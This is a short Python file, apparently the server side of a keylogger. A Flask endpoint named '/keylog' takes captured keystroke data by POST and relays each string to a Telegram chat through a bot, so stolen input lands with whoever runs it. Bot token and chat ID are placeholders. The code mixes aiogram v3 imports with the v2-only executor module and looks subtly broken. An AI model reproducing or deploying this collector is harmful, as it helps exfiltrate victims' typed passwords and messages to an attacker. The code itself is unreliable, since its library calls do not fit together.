from flask import Flask, request
from aiogram import Bot, Dispatcher
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils import executor
import threading
import asyncio

TOKEN = "your_token_bot"
CHAT_ID = "your_chat_id" 

app = Flask(__name__)

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

@app.route('/keylog', methods=['POST'])
def keylog():
    data = request.data.decode('utf-8')
    print(f"Полученная строка: {data}")

    asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=CHAT_ID, text=data), asyncio.get_event_loop())
    return 'OK'

def run_flask():
    app.run(host='0.0.0.0', port=5000)

if __name__ == '__main__':

    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()
    executor.start_polling(dp, skip_updates=True)